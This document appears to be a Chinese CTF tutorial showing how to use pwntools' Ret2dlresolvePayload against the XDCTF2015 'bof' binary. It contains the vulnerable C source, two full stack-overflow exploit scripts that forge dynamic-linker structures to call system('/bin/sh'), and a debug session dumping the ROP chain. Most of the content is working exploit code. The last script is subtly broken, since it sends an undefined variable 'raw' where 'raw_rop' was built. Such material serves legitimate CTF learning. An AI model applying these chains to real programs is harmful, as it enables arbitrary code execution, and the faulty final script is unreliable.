对于Ret2dlresolve，payload构造特别麻烦，但pwntools有相应的工具，其payload构造可以由Ret2dlresolvePayload来完成。（真香）



help(pwnlib.rop.ret2dlresolve.Ret2dlresolvePayload)

```python
Help on class Ret2dlresolvePayload in module pwnlib.rop.ret2dlresolve:

class Ret2dlresolvePayload(__builtin__.object)
 |  Methods defined here:
 |  
 |  __init__(self, elf, symbol, args, data_addr=None)
 |  
 |  ----------------------------------------------------------------------
 |  Data descriptors defined here:
 |  
 |  __dict__
 |      dictionary for instance variables (if defined)
 |  
 |  __weakref__
 |      list of weak references to the object (if defined)

```

elf：相应的文件

symbol：函数名称

args：函数参数

data_addr：该payload所在的地址(默认会会放在bss比较高的地址上)

常用方法（用之前要设置context.binary和elf）

```python
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"],data_addr=0x804ad00)#data_addr直接默认也行，它会自己找到一个合适的地址
```





漏洞程序源码 bof.c（32位）

```c
#include<unistd.h>
#include<stdio.h>
#include<string.h>
void vuln()
{
    char buf[100];
    setbuf(stdin, buf);
    read(0, buf, 256);
}
int main()
{
    char buf[100] = "Welcome to XDCTF2015~!\n";

    setbuf(stdout, buf);
    write(1, buf, strlen(buf));
    vuln();
    return 0;
}
```

exp：

```python
from pwn import*
context.log_level = 'debug'
context.binary = elf = ELF("./bof")
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])

p = process('./bof')
base_stage = dlresolve.data_addr
p3_ret = 0x08048649 #pop esi ; pop edi ; pop ebp ; ret
pebp_ret = 0x0804864b #pop ebp ; ret
leave_ret = 0x0804853a
payload1 = 'a'*112+p32(elf.plt['read'])+p32(p3_ret)+p32(0)+p32(base_stage)+p32(0x200)
payload1 += p32(0x08048370) + p32(dlresolve.reloc_index) + 'dead'+p32(dlresolve.real_args[0])
p.sendafter('!',payload1)
pause()
p.send(dlresolve.payload)

p.interactive()
```



当然，pwntools对于rop也是有模块可以用的，一些gadgets它会自动去程序里找（真香）。

print(rop.dump())可以查看rop链内容

```python
>>> from pwn import *
>>> context.log_level = 'debug'
>>> context.binary = elf = ELF("./bof")
[DEBUG] PLT 0x8048380 setbuf
[DEBUG] PLT 0x8048390 read
[DEBUG] PLT 0x80483a0 strlen
[DEBUG] PLT 0x80483b0 __libc_start_main
[DEBUG] PLT 0x80483c0 write
[DEBUG] PLT 0x80483d0 __gmon_start__
[*] '/home/tty18pwn/Desktop/ret2dl/x2015/bof'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
>>> rop = ROP(context.binary)
[*] Loaded 10 cached gadgets for './bof'
>>> dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
[DEBUG] Symtab: 0x80481cc
[DEBUG] Strtab: 0x804826c
[DEBUG] Versym: 0x80482d8
[DEBUG] Jmprel: 0x8048324
[DEBUG] ElfSym addr: 0x804ae0c
[DEBUG] ElfRel addr: 0x804ae1c
[DEBUG] Symbol name addr: 0x804ae00
[DEBUG] Version index addr: 0x8048860
[DEBUG] Data addr: 0x804ae00
>>> # pwntools will help us choose a proper addr
... rop.read(0,dlresolve.data_addr)
>>> rop.ret2dlresolve(dlresolve)
[DEBUG] PLT_INIT: 0x8048370
>>> print(rop.dump())
0x0000:        0x8048390 read(0, 0x804ae00)
0x0004:        0x804864a <adjust @0x10> pop edi; pop ebp; ret
0x0008:              0x0 arg0
0x000c:        0x804ae00 arg1
0x0010:        0x8048370 [plt_init] system(0x804ae24)
0x0014:           0x2af8 [dlresolve index]
0x0018:           'gaaa' <return address>
0x001c:        0x804ae24 arg0
```



所以exp可以进一步简化。

```python
from pwn import *
context.log_level = 'debug'
context.binary = elf = ELF("./bof")
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])

rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
print(rop.dump())
raw_rop = rop.chain()
io = process("./bof")
io.sendafter('\n',flat([{112:raw}]))
pause()
io.send(dlresolve.payload)
io.interactive()

```







